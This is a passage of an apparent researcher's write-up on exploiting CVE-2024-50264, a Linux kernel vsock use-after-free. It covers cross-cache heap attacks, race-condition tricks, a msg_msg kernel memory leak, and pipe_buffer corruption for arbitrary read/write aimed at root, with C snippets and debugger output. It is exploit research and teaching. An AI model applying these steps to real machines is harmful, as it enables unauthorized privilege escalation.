      &lt;item&gt;&lt;code&gt;drill_uaf_w_pte.c&lt;/code&gt;: a UAF exploit that writes to a freed&lt;code&gt;drill_item_t&lt;/code&gt;. It performs a cross-allocator attack and overwrites a page table entry (PTE) to implement the Dirty Pagetable technique and gain LPE on&lt;code&gt;x86_64&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_w_pud.c&lt;/code&gt;: an improved version of&lt;code&gt;__drill_uaf_w_pte.c__&lt;/code&gt;that overwrites a page upper directory (PUD) instead of a PTE and implements the Dirty Pagetable attack via huge pages.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When I revisited &lt;code&gt;kernel-hack-drill&lt;/code&gt; during my CVE-2024-50264 work, this spare-time project hadn't seen an update in years. But now &lt;code&gt;kernel-hack-drill&lt;/code&gt; offers a solid set of resources that Linux kernel security researchers can explore.&lt;/p&gt;
    &lt;head rend="h2"&gt;Experimenting with cross-cache attack using kernel-hack-drill&lt;/head&gt;
    &lt;p&gt;My first step was to learn how cross-cache attacks behave on the latest Ubuntu kernel with slab allocator hardening turned on.&lt;/p&gt;
    &lt;p&gt;I implemented a standard cross-cache attack in &lt;code&gt;drill_uaf_w_msg_msg.c&lt;/code&gt;. You can see the full code in the repository, so I'll sketch the flow here. For background, I highly recommend Andrey Konovalov's talk SLUB Internals for Exploit Developers.&lt;/p&gt;
    &lt;p&gt;To plan the attack, I pulled the needed info from &lt;code&gt;/sys/kernel/slab&lt;/code&gt;. The slab caches that hold &lt;code&gt;virtio_vsock_sock&lt;/code&gt; (80 bytes) or &lt;code&gt;drill_item_t&lt;/code&gt; (95 bytes) each keep 120 slabs in per-CPU partial lists (&lt;code&gt;cpu_partial=120&lt;/code&gt;) and 42 objects in each slab (&lt;code&gt;objs_per_slab=42&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;The cross-cache attack algorithm:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Allocate &lt;code&gt;objs_per_slab&lt;/code&gt;objects to create a fresh active slab. Active slab is the slab that will be used by the kernel for the next allocation.&lt;/item&gt;
      &lt;item&gt;Allocate &lt;code&gt;objs_per_slab * cpu_partial&lt;/code&gt;objects. This creates the&lt;code&gt;cpu_partial&lt;/code&gt;number of full slabs that will later populate the partial list at step 6.&lt;/item&gt;
      &lt;item&gt;Create a slab that contains the UAF object. Allocate &lt;code&gt;objs_per_slab&lt;/code&gt;objects and keep a dangling reference to the vulnerable object in that slab.&lt;/item&gt;
      &lt;item&gt;Create a new active slab again: allocate &lt;code&gt;objs_per_slab&lt;/code&gt;objects. This step is very important for keeping the cross-cache attack stable. Otherwise, the slab with the vulnerable object remains active and cannot be reclaimed by the page allocator.&lt;/item&gt;
      &lt;item&gt;Completely free the slab that holds the UAF object. To do that, free &lt;code&gt;(objs_per_slab * 2 - 1)&lt;/code&gt;of the objects allocated just before the last one. The active slab now contains only the last object, and the slab with the UAF object becomes free and moves to the partial list.&lt;/item&gt;
      &lt;item&gt;Fill up the partial list: free one of each &lt;code&gt;objs_per_slab&lt;/code&gt;objects in the reserved slabs from step 2. That makes the slab allocator clean up the partial list and move the free slab containing the UAF object to the page allocator.&lt;/item&gt;
      &lt;item&gt;Reclaim the page that contained the UAF object for another slab cache: spray the target &lt;code&gt;msg_msg&lt;/code&gt;objects. As a result, one&lt;code&gt;msg_msg&lt;/code&gt;is allocated where the vulnerable object (&lt;code&gt;drill_item_t&lt;/code&gt;in my case) used to be.&lt;/item&gt;
      &lt;item&gt;Exploit the UAF! Overwrite &lt;code&gt;msg_msg.m_ts&lt;/code&gt;to read kernel memory out of bounds.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I've seen plenty of publications that cover cross-cache attack, but none of them explain how to debug it. I'll fill that gap.&lt;/p&gt;
    &lt;p&gt;Let's examine the attack in &lt;code&gt;drill_uaf_w_msg_msg.c&lt;/code&gt;. To watch it in action and debug it, make the following tweaks in your kernel sources:&lt;/p&gt;

    &lt;p&gt;When the cross-cache attack succeeds, the slab that held &lt;code&gt;drill_item_t&lt;/code&gt; objects is handed back to the page allocator and then reused for &lt;code&gt;msg_msg&lt;/code&gt; objects. Running the PoC exploit &lt;code&gt;drill_uaf_w_msg_msg&lt;/code&gt; makes this visible, as we observe:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;In the kernel log: &lt;code&gt;[ 32.719582] drill: kmalloc'ed item 5123 (0xffff88800c960660, size 95)&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Then in stdout: &lt;code&gt;[+] done, current_n: 5124 (next for allocating) [!] obtain dangling reference from use-after-free bug [+] done, uaf_n: 5123&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Then in GDB (using with bata24/gef): &lt;code&gt;gef&amp;gt; slab-contains 0xffff88800c960660 [+] Wait for memory scan slab: 0xffffea0000325800 kmem_cache: 0xffff888003c45300 base: 0xffff88800c960000 name: kmalloc-rnd-05-96 size: 0x60 num_pages: 0x1&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Finally, in the kernel log: &lt;code&gt;[ 36.778165] drill: free item 5123 (0xffff88800c960660) ... [ 36.807956] __put_partials: cache 0xffff888003c45300 slab 0xffffea0000325800 ... [ 36.892053] msg_msg 0xffff88800c960660&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We see the &lt;code&gt;drill_item_t&lt;/code&gt; object &lt;code&gt;0xffff88800c960660&lt;/code&gt; in slab &lt;code&gt;0xffffea0000325800&lt;/code&gt; reallocated as &lt;code&gt;msg_msg&lt;/code&gt;, which confirms that the cross-cache attack worked.&lt;/p&gt;
    &lt;p&gt;After experimenting with &lt;code&gt;kernel-hack-drill&lt;/code&gt; on Ubuntu Server 24.04, I found that &lt;code&gt;CONFIG_RANDOM_KMALLOC_CACHES&lt;/code&gt; and &lt;code&gt;CONFIG_SLAB_BUCKETS&lt;/code&gt; block naive UAF exploitation, yet they also make cross-cache attacks absolutely stable. So, in my humble opinion:&lt;/p&gt;
    &lt;p&gt;It seems that, without a mitigation such as SLAB_VIRTUAL, the Linux kernel remains wide-open to cross-cache attacks.&lt;/p&gt;
    &lt;head rend="h2"&gt;Adapting the cross-cache attack to CVE-2024-50264&lt;/head&gt;
    &lt;p&gt;As noted in the limitations, the vulnerable &lt;code&gt;virtio_vsock_sock&lt;/code&gt; client object is allocated together with the server object (Limitation #1). That hurts the exploit for two reasons:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;On one hand, leaving the server vsock open stops the slab that holds the UAF object from being freed, which kills the cross-cache attack.&lt;/item&gt;
      &lt;item&gt;On the other hand, closing the server vsock disturbs the UAF itself.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;How to deal with it? @v4bel and @qwerty used the SLUBStick timing side channel to spot when the allocator switched to a new active slab. I went another way:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;What if I hit the&lt;/p&gt;&lt;code&gt;connect()&lt;/code&gt;syscall with a signal almost immediately?&lt;/quote&gt;
    &lt;p&gt;In short, I used one more race condition to exploit the main race condition – and it worked:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;I sent the "immortal" signal 33 to the vulnerable &lt;code&gt;connect()&lt;/code&gt;syscall after a 10000 ns timeout, far earlier than the delay needed to trigger the UAF.&lt;/item&gt;
      &lt;item&gt;Then I verified the early race condition: &lt;list rend="ol"&gt;&lt;item&gt;The &lt;code&gt;connect()&lt;/code&gt;syscall must return "Interrupted system call"&lt;/item&gt;&lt;item&gt;Another testing client vsock should still connect to the server vsock without trouble&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;The &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I discovered that when both checks passed, only a single vulnerable &lt;code&gt;virtio_vsock_sock&lt;/code&gt; for the client vsock was created. The interrupting signal arrived before the kernel could create the second &lt;code&gt;virtio_vsock_sock&lt;/code&gt; for the server vsock. This bypassed Limitation #1 (paired-object creation). After that, I sent signal 33 again – this time after the normal timeout – to interrupt the vulnerable &lt;code&gt;connect()&lt;/code&gt; a second time and provoke the UAF. The cross-cache attack against &lt;code&gt;virtio_vsock_sock&lt;/code&gt; was unlocked!&lt;/p&gt;
    &lt;p&gt;Looping this early race and checking its result was quick. Once the early race succeeded, the main race that triggers the UAF became more stable; I could now hit the UAF about once per second instead of once every several minutes, solving the instability noted in Limitation #2. My race condition "speedrun" also eased Limitation #5: I managed roughly five UAF writes before the kworker hit a null-ptr-deref at &lt;code&gt;VSOCK_CLOSE_TIMEOUT&lt;/code&gt; (8 seconds).&lt;/p&gt;
    &lt;p&gt;To address Limitation #4 (the immediate null-ptr-deref in the kworker after UAF), I tried one more race condition, similarly to @v4bel and @qwerty. Right after the UAF-triggering &lt;code&gt;connect()&lt;/code&gt;, I called &lt;code&gt;listen()&lt;/code&gt; on the vulnerable vsock. If &lt;code&gt;listen()&lt;/code&gt; ran before the kworker, it changed the vsock state to &lt;code&gt;TCP_LISTEN&lt;/code&gt;, preventing the crash. Unfortunately, this step remains the most unstable part of the whole exploit; the rest is far more stable.&lt;/p&gt;
    &lt;p&gt;At that point my list of CVE-2024-50264 limitations looked like this:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;del rend="overstrike"&gt;The vulnerable&lt;/del&gt;&lt;code&gt;virtio_vsock_sock&lt;/code&gt;client object is allocated together with the server object from the same slab cache. That disturbs cross-cache attacks.&lt;/item&gt;
      &lt;item&gt;
        &lt;del rend="overstrike"&gt;Reproducing this race condition is very unstable.&lt;/del&gt;
      &lt;/item&gt;
      &lt;item&gt;The UAF write occurs in a kworker a few microseconds after &lt;code&gt;kfree()&lt;/code&gt;, too quickly for typical cross-cache attacks.&lt;/item&gt;
      &lt;item&gt;
        &lt;del rend="overstrike"&gt;A null-ptr-deref in the kworker follows the UAF write. That's why I shelved the bug at first.&lt;/del&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;del rend="overstrike"&gt;Even if that kernel oops is avoided, another null-ptr-deref occurs in the kworker after&lt;/del&gt;&lt;code&gt;VSOCK_CLOSE_TIMEOUT&lt;/code&gt;(eight seconds).&lt;/item&gt;
      &lt;item&gt;The kworker hangs in &lt;code&gt;spin_lock_bh()&lt;/code&gt;if&lt;code&gt;virtio_vsock_sock.tx_lock&lt;/code&gt;is not zero.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;With the early-signal trick in place, only two limitations were still blocking my exploit.&lt;/p&gt;
    &lt;head rend="h2"&gt;Oh so slow! The cross-cache attack shows up late to the party&lt;/head&gt;
    &lt;p&gt;As noted in Limitation #3, the UAF write in the kworker fires only a few μs after &lt;code&gt;kfree()&lt;/code&gt; for the &lt;code&gt;virtio_vsock_sock&lt;/code&gt;. A cross-cache attack needs much more time, so the UAF write lands on the original &lt;code&gt;virtio_vsock_sock&lt;/code&gt; and never reaches the &lt;code&gt;msg_msg&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;I didn't know how to make cross-cache procedure faster, but I knew how to slow down the attacked kernel code instead. That approach is described in Jann Horn's article Racing against the clock. It allowed to make my kworker slower than a sluggish cross-cache attack.&lt;/p&gt;
    &lt;p&gt;The main idea is to hammer the kworker with a &lt;code&gt;timerfd&lt;/code&gt; watched by a huge pile of &lt;code&gt;epoll&lt;/code&gt; instances. Here is the short recipe (see Jann's article for full detail):&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Call &lt;code&gt;timerfd_create(CLOCK_MONOTONIC, 0)&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Create 8 forks.&lt;/item&gt;
      &lt;item&gt;In each fork, call &lt;code&gt;dup()&lt;/code&gt;for the&lt;code&gt;timerfd&lt;/code&gt;100 times.&lt;/item&gt;
      &lt;item&gt;In each fork, call &lt;code&gt;epoll_create()&lt;/code&gt;500 times.&lt;/item&gt;
      &lt;item&gt;For every &lt;code&gt;epoll&lt;/code&gt;instance, use&lt;code&gt;epoll_ctl()&lt;/code&gt;to add all duplicated file descriptors to the interest list – each&lt;code&gt;epoll&lt;/code&gt;instance now monitors all available&lt;code&gt;timerfd&lt;/code&gt;copies.&lt;/item&gt;
      &lt;item&gt;Finally, arm the &lt;code&gt;timerfd&lt;/code&gt;so the interrupt hits the kworker at just the right moment:&lt;code&gt;timerfd_settime(timerfd, TFD_TIMER_CANCEL_ON_SET, &amp;amp;retard_tmo, NULL)&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This procedure made my race-condition window around 80 times longer.&lt;/p&gt;
    &lt;p&gt;I wanted some more time to complete the cross-cache attack with a guarantee, but ran into a limit not mentioned in the original write-up. If you exceed the limit in &lt;code&gt;/proc/sys/fs/epoll/max_user_watches&lt;/code&gt;, &lt;code&gt;epoll_ctl()&lt;/code&gt; fails. From &lt;code&gt;man 7 epoll&lt;/code&gt;:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;This specifies a limit on the total number of file descriptors that a user can register across all epoll instances on the system. The limit is per real user ID. Each registered file descriptor costs roughly 90 bytes on a 32-bit kernel, and roughly 160 bytes on a 64-bit kernel. Currently, the default value for max_user_watches is 1/25 (4%) of the available low memory, divided by the registration cost in bytes.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;On Ubuntu Server 24.04 with 2 GiB of RAM, &lt;code&gt;/proc/sys/fs/epoll/max_user_watches&lt;/code&gt; is 431838, which is not huge. I could afford 8 forks × 500 &lt;code&gt;epoll&lt;/code&gt; instances × 100 duplicated file descriptors, for a total of 400000 &lt;code&gt;epoll&lt;/code&gt; watches.&lt;/p&gt;
    &lt;p&gt;That was just enough to beat Limitation #3, and I finally got &lt;code&gt;msg_msg&lt;/code&gt; data size corruption: the vsock UAF changed &lt;code&gt;msg_msg.m_ts&lt;/code&gt; from 48 bytes to 8192 (&lt;code&gt;MSGMAX&lt;/code&gt;). Now I could do out-of-bounds reading of the kernel memory using the &lt;code&gt;msgrcv()&lt;/code&gt; syscall.&lt;/p&gt;
    &lt;head rend="h2"&gt;Sorting the loot&lt;/head&gt;
    &lt;p&gt;The corrupted &lt;code&gt;msg_msg&lt;/code&gt; allowed me to read 8 KiB of data from the kernelspace.  I sorted this loot and found a promising infoleak: a kernel address &lt;code&gt;0xffffffff8233cfa0&lt;/code&gt; [1]. This infoleak was quite stable and worked with high probability, so I decided to investigate it without doing any additional heap feng shui. GDB showed that it was a pointer to the &lt;code&gt;socket_file_ops()&lt;/code&gt; kernel function. I was excited to discover that this function pointer is part of &lt;code&gt;struct file&lt;/code&gt;, because the &lt;code&gt;file&lt;/code&gt; kernel object also contains the &lt;code&gt;f_cred&lt;/code&gt; pointer [2], which leaked as well.&lt;/p&gt;
    &lt;p&gt;Here's how I examined the memory leaked by &lt;code&gt;msg_msg&lt;/code&gt; at &lt;code&gt;0xffff88800e75d600&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;gef&amp;gt; p *((struct file *)(0xffff88800e75d600 + 96*26 + 64))
$61 = {
  f_count = {
    counter = 0x0
  },
  f_lock = {
    {
      rlock = {
        raw_lock = {
          {
            val = {
              counter = 0x0
            },
            {
              locked = 0x0,
              pending = 0x0
            },
            {
              locked_pending = 0x0,
              tail = 0x0
            }
          }
        }
      }
    }
  },
  f_mode = 0x82e0003,
  f_op = 0xffffffff8233cfa0 &amp;lt;socket_file_ops&amp;gt;,    [1]
  f_mapping = 0xffff88800ee66f60,
  private_data = 0xffff88800ee66d80,
  f_inode = 0xffff88800ee66e00,
  f_flags = 0x2,
  f_iocb_flags = 0x0,
  f_cred = 0xffff888003b7ad00,                    [2]
  f_path = {
    mnt = 0xffff8880039cec20,
    dentry = 0xffff888005b30b40
  },
  ...
&lt;/code&gt;
    &lt;p&gt;As a result, my PoC exploit obtained a pointer to &lt;code&gt;struct cred&lt;/code&gt;, the structure that stores the current process credentials. The last piece needed for privilege escalation was arbitrary address writing. With that, I could overwrite the exploit process credentials and become root. That would be a data-only attack with no control-flow hijack.&lt;/p&gt;
    &lt;head rend="h2"&gt;In search of arbitrary address writing primitive&lt;/head&gt;
    &lt;p&gt;The most interesting and difficult part of the research began here. I was searching for a target kernel object for my UAF write, which could provide an arbitrary address writing exploit primitive. The search was exhausting. I've done the following:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Looked through dozens of kernel objects,&lt;/item&gt;
      &lt;item&gt;Read many kernel exploit write-ups,&lt;/item&gt;
      &lt;item&gt;Tried Kernel Exploitation Dashboard by Eduardo Vela and the KernelCTF team.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;One idea was to combine my limited UAF write with the Dirty Page Table attack (well described by Nicolas Wu). Tweaking page tables can let an attacker read and write data at arbitrary physical address.&lt;/p&gt;
    &lt;p&gt;I could combine my UAF with a cross-cache attack (or more accurately, cross-allocator attack) to modify page tables. To overwrite kernel text or heap, though, I still needed to know the physical address of the target memory. Two options came to mind:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Bruteforcing physical addresses. Not practical here: I could trigger the UAF only about five times before the kworker crashed, nowhere near enough tries.&lt;/item&gt;
      &lt;item&gt;Using the KASLR infoleak from my &lt;code&gt;msg_msg&lt;/code&gt;out-of-bounds read. I decided to try that.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I ran a quick experiment to see how KASLR behaves on &lt;code&gt;X86_64&lt;/code&gt; with &lt;code&gt;CONFIG_RANDOMIZE_BASE&lt;/code&gt; and &lt;code&gt;CONFIG_RANDOMIZE_MEMORY&lt;/code&gt; enabled. Booting a virtual machine several times, I compared the virtual and physical addresses of kernel &lt;code&gt;_text&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;VM run #1:&lt;/p&gt;
    &lt;code&gt;gef&amp;gt; ksymaddr-remote
[+] Wait for memory scan
0xffffffff98400000 T _text

gef&amp;gt; v2p 0xffffffff98400000
Virt: 0xffffffff98400000 -&amp;gt; Phys: 0x57400000
&lt;/code&gt;
    &lt;p&gt;VM run #2:&lt;/p&gt;
    &lt;code&gt;gef&amp;gt; ksymaddr-remote
[+] Wait for memory scan
0xffffffff81800000 T _text

gef&amp;gt; v2p 0xffffffff81800000
Virt: 0xffffffff81800000 -&amp;gt; Phys: 0x18600000
&lt;/code&gt;
    &lt;p&gt;Then I calculated the difference between the virtual and physical addresses:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;VM run #1: &lt;code&gt;0xffffffff98400000 − 0x57400000 = 0xffffffff41000000&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;VM run #2: &lt;code&gt;0xffffffff81800000 − 0x18600000 = 0xffffffff69200000&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Because &lt;code&gt;0xffffffff41000000&lt;/code&gt; is not equal to &lt;code&gt;0xffffffff69200000&lt;/code&gt;, leaking the virtual KASLR offset doesn't help against physical KASLR.&lt;/p&gt;
    &lt;p&gt;Thereby to perform Dirty Page Table attack, I needed a way to leak a kernel physical address. Ideally I would do this by mixing some page-allocator feng shui with my out-of-bounds read. That felt messy, and I wanted a cleaner solution.&lt;/p&gt;
    &lt;p&gt;I kept looking for a target kernel object for my UAF write, which could provide an arbitrary address writing and eventually focused on &lt;code&gt;pipe_buffer&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;When a pipe is created with the &lt;code&gt;pipe()&lt;/code&gt; system call, the kernel allocates an array of &lt;code&gt;pipe_buffer&lt;/code&gt; structures. Each &lt;code&gt;pipe_buffer&lt;/code&gt; item in this array corresponds to a memory page that holds data written to the pipe. The diagram below shows the internals of this object:&lt;/p&gt;
    &lt;p&gt;This object looked like a good UAF target. I could make a &lt;code&gt;pipe_buffer&lt;/code&gt; array the same size as &lt;code&gt;virtio_vsock_sock&lt;/code&gt; by changing the capacity of the pipe: &lt;code&gt;fcntl(pipe_fd[1], F_SETPIPE_SZ, PAGE_SIZE * 2)&lt;/code&gt;. The kernel changes the array size to &lt;code&gt;2 * sizeof(struct pipe_buffer) = 80 bytes&lt;/code&gt;, exactly matching the &lt;code&gt;virtio_vsock_sock&lt;/code&gt; size.&lt;/p&gt;
    &lt;p&gt;In addition, 4 attacker-controlled bytes from the vsock UAF write at offset 24 can flip &lt;code&gt;pipe_buffer.flags&lt;/code&gt;, just as in Max Kellermann's original Dirty Pipe attack.&lt;/p&gt;
    &lt;p&gt;The original Dirty Pipe attack doesn't even need an infoleak and grants privilege escalation with a one-shot write. Impressed, I decided to experiment with &lt;code&gt;pipe_buffer&lt;/code&gt; in my &lt;code&gt;kernel-hack-drill&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;Experimenting with the Dirty Pipe attack&lt;/head&gt;
    &lt;p&gt;First, I built a Dirty Pipe prototype in &lt;code&gt;kernel-hack-drill&lt;/code&gt;; the PoC exploit &lt;code&gt;drill_uaf_w_pipe_buffer.c&lt;/code&gt; is in the repository. It:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;performs a cross-cache attack and reclaims the slab that held &lt;code&gt;drill_item_t&lt;/code&gt;objects as a slab for&lt;code&gt;pipe_buffer&lt;/code&gt;objects&lt;/item&gt;
      &lt;item&gt;exploits the UAF write to &lt;code&gt;drill_item_t&lt;/code&gt;; the attacker-controlled bytes written to&lt;code&gt;drill_item_t&lt;/code&gt;at offset 24, modify&lt;code&gt;pipe_buffer.flags&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;implements the Dirty Pipe attack, achieving LPE in one shot without an infoleak, cool!&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;To use this technique in my CVE-2024-50264 PoC exploit, I still had to bypass the last remaining Limitation #6: the kworker hangs before the UAF write if &lt;code&gt;virtio_vsock_sock.tx_lock&lt;/code&gt; is non-zero. I managed to solve that by doing &lt;code&gt;splice()&lt;/code&gt; from a regular file to the pipe, starting at offset zero:&lt;/p&gt;
    &lt;code&gt;	loff_t file_offset = 0;
	ssize_t bytes = 0;

	/* N.B. splice modifies the file_offset value */
	bytes = splice(temp_file_fd, &amp;amp;file_offset, pipe_fd[1], NULL, 1, 0);
	if (bytes &amp;lt; 0)
		err_exit("[-] splice");
	if (bytes != 1)
		err_exit("[-] splice short");
&lt;/code&gt;
    &lt;p&gt;In that case, the &lt;code&gt;pipe_buffer.offset&lt;/code&gt; field remains zero, so the kworker does not hang while acquiring the spinlock:&lt;/p&gt;
    &lt;p&gt;This seemed like a breakthrough – until I noticed that the UAF write also corrupted the &lt;code&gt;pipe_buffer.ops&lt;/code&gt; function pointer by four zero bytes of &lt;code&gt;peer_fwd_cnt&lt;/code&gt;. That unfortunate side effect provoked kernel crashes on every later operation involving &lt;code&gt;pipe_buffer&lt;/code&gt; ☹️:&lt;/p&gt;
    &lt;p&gt;This brought me to the following line of reasoning:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Completing the Dirty Pipe attack requires a working &lt;code&gt;pipe_buffer&lt;/code&gt;with an unchanged&lt;code&gt;ops&lt;/code&gt;pointer value.&lt;/item&gt;
      &lt;item&gt;Preserving &lt;code&gt;0xffffffff&lt;/code&gt;in the most significant bytes of the&lt;code&gt;pipe_buffer.ops&lt;/code&gt;function pointer requires that same value in&lt;code&gt;peer_fwd_cnt&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Setting &lt;code&gt;peer_fwd_cnt&lt;/code&gt;in&lt;code&gt;virtio_vsock_sock&lt;/code&gt;means sending data through the vsock.&lt;/item&gt;
      &lt;item&gt;Sending data through a vsock first needs a successful &lt;code&gt;connect()&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;However, a successful &lt;code&gt;connect()&lt;/code&gt;on the vulnerable vsock makes the UAF impossible ⛔.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Alas!&lt;/p&gt;
    &lt;head rend="h2"&gt;Pipe buffer entertainment&lt;/head&gt;
    &lt;p&gt;So the original Dirty Pipe technique wouldn't fit my CVE-2024-50264 PoC exploit. But suddenly an idea struck me:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;What if I create a pipe with capacity&lt;/p&gt;&lt;code&gt;PAGE_SIZE * 4&lt;/code&gt;forcing the kernel to allocate four&lt;code&gt;pipe_buffer&lt;/code&gt;objects in&lt;code&gt;kmalloc-192&lt;/code&gt;?&lt;/quote&gt;
    &lt;p&gt;In that case, the memory object overlapping looked like this: four &lt;code&gt;pipe_buffer&lt;/code&gt; objects in one &lt;code&gt;kmalloc-192&lt;/code&gt; slab are allocated at the place of two &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects in two &lt;code&gt;kmalloc-96&lt;/code&gt; slabs. The following diagram illustrates the overlap:&lt;/p&gt;
    &lt;p&gt;Here, memory corruption can land on either of the two &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects. I'll cover these cases one at a time.&lt;/p&gt;
    &lt;p&gt;To avoid the kernel hang and crash when the UAF hits &lt;code&gt;virtio_vsock_sock&lt;/code&gt; #1, I used two tricks:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Performed a &lt;code&gt;splice()&lt;/code&gt;from a regular file to the pipe with a starting offset of zero. As mentioned earlier, this keeps the&lt;code&gt;offset&lt;/code&gt;field of the first&lt;code&gt;pipe_buffer&lt;/code&gt;at zero, so the kworker doesn't hang while acquiring the spinlock.&lt;/item&gt;
      &lt;item&gt;Discarded that first &lt;code&gt;pipe_buffer&lt;/code&gt;before triggering the UAF, leaving its&lt;code&gt;offset&lt;/code&gt;field untouched:&lt;code&gt;/* Remove the first pipe_buffer without changing the `pipe_buffer.offset` */ bytes = splice(pipe_fd[0], NULL, temp_pipe_fd[1], NULL, 1, 0); if (bytes &amp;lt; 0) err_exit("[-] splice"); if (bytes == 0) err_exit("[-] splice short"); /* * Let's read this byte and empty the first pipe_buffer. * So if the UAF writing corrupts the first pipe_buffer, * that will not crash the kernel. Cool! */ bytes = read(temp_pipe_fd[0], pipe_data_to_read, 1); /* 1 spliced byte */ if (bytes &amp;lt; 0) err_exit("[-] pipe read 1"); if (bytes != 1) err_exit("[-] pipe read 1 short");&lt;/code&gt;&lt;p&gt;After this sequence of&lt;/p&gt;&lt;code&gt;splice()&lt;/code&gt;and&lt;code&gt;read()&lt;/code&gt;, the first&lt;code&gt;pipe_buffer&lt;/code&gt;becomes inactive. Even if the subsequent UAF overwrites its&lt;code&gt;ops&lt;/code&gt;pointer, later pipe operations won't dereference that corrupted pointer, so no kernel crash occurs.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I wanted to exploit the UAF on &lt;code&gt;virtio_vsock_sock&lt;/code&gt; #2 to overwrite the fourth &lt;code&gt;pipe_buffer&lt;/code&gt;. To prevent the kernel hang when the UAF hits this second &lt;code&gt;virtio_vsock_sock&lt;/code&gt;, I called the same &lt;code&gt;splice(temp_file_fd, &amp;amp;file_offset, pipe_fd[1], NULL, 1, 0)&lt;/code&gt; two more times. These syscalls initialized the second and third &lt;code&gt;pipe_buffer&lt;/code&gt; objects, leaving their &lt;code&gt;flags&lt;/code&gt; at zero, since this pipe operation doesn't set any &lt;code&gt;PIPE_BUF_FLAG_*&lt;/code&gt; bits. Therefore, if the UAF occurs on the second &lt;code&gt;virtio_vsock_sock&lt;/code&gt;, the &lt;code&gt;spin_lock_bh()&lt;/code&gt; in &lt;code&gt;virtio_transport_space_update()&lt;/code&gt; will not hang.&lt;/p&gt;
    &lt;p&gt;These preparations of the pipe opened a door for corrupting the &lt;code&gt;page&lt;/code&gt; pointer of the fourth &lt;code&gt;pipe_buffer&lt;/code&gt;:&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;kernel-hack-drill&lt;/code&gt; let me experiment with &lt;code&gt;pipe_buffer&lt;/code&gt; objects. Without it, crafting this exploit primitive for the tricky CVE-2024-50264 would have been extremely hard.&lt;/p&gt;
    &lt;head rend="h2"&gt;AARW and KASLR's last revenge&lt;/head&gt;
    &lt;p&gt;In a &lt;code&gt;pipe_buffer&lt;/code&gt;, the &lt;code&gt;page&lt;/code&gt; pointer holds the address of a &lt;code&gt;struct page&lt;/code&gt; inside the virtual memory map (&lt;code&gt;vmemmap&lt;/code&gt;). &lt;code&gt;vmemmap&lt;/code&gt; is an array of these structures that allows the kernel to address physical memory efficiently. It is mentioned in &lt;code&gt;Documentation/arch/x86/x86_64/mm.rst&lt;/code&gt;:&lt;/p&gt;

&lt;/code&gt;
    &lt;p&gt;Hence, when I managed to perform a UAF write of controlled data to the &lt;code&gt;pipe_buffer.page&lt;/code&gt; pointer, I gained arbitrary address reading and writing (AARW) via the pipe. However, I wasn't able to change the AARW target address many times, as I mentioned in Limitation #5, so I had to choose the target in &lt;code&gt;vmemmap&lt;/code&gt; carefully.&lt;/p&gt;
    &lt;p&gt;My first thought was to overwrite part of the kernel code. But with KASLR enabled, I didn't know the physical address of kernel &lt;code&gt;_text&lt;/code&gt; and therefore couldn't determine its location inside &lt;code&gt;vmemmap&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;That's why I decided to use the pipe AARW against &lt;code&gt;struct cred&lt;/code&gt; in the kernel heap. As I described earlier, I leaked the virtual address of &lt;code&gt;cred&lt;/code&gt; using my &lt;code&gt;msg_msg&lt;/code&gt; out-of-bounds read. This virtual address looked like &lt;code&gt;0xffff888003b7ad00&lt;/code&gt;, and I understood it was from the direct mapping of all physical memory. So I used the following formula to calculate the offset of the corresponding &lt;code&gt;struct page&lt;/code&gt; in &lt;code&gt;vmemmap&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;#define STRUCT_PAGE_SZ 64lu
